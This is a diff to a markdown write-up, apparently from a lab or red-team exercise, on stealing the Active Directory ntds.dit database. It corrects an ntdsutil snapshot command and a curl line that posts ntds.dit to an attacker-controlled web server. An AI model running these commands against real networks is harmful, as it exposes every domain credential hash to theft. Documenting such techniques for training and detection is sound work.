@@ -4,8 +4,8 @@ In an Active Directory ecosystem, ntds.dit file contains all domain usernames, g
 ## Execution:
 First a snapshot was created using ntdsutil.exe, then data was exfilterated to a web server the attacker controls
 ```
-ntds "ac i ntds" "ifm" "create full C:\Exfil_Drop" q q
-curl -X POST -H "Content-Type: application/octet-stream" --data-binary @"C:\Exfil_Drop\ntds.dit" http://192.168.100.30:8000/upload
+ntdsutil "ac i ntds" "ifm" "create full C:\Exfil_Drop" q q
+curl -X POST -H "Content-Type: application/octet-stream" --data-binary @"C:\Exfil_Drop\Active Directory\ntds.dit" http://192.168.100.30:8000/upload
 ```
 <img width="880" height="618" alt="ntds" src="https://github.com/user-attachments/assets/71bb10be-d40e-4958-b8b3-918330c1112e" />
 
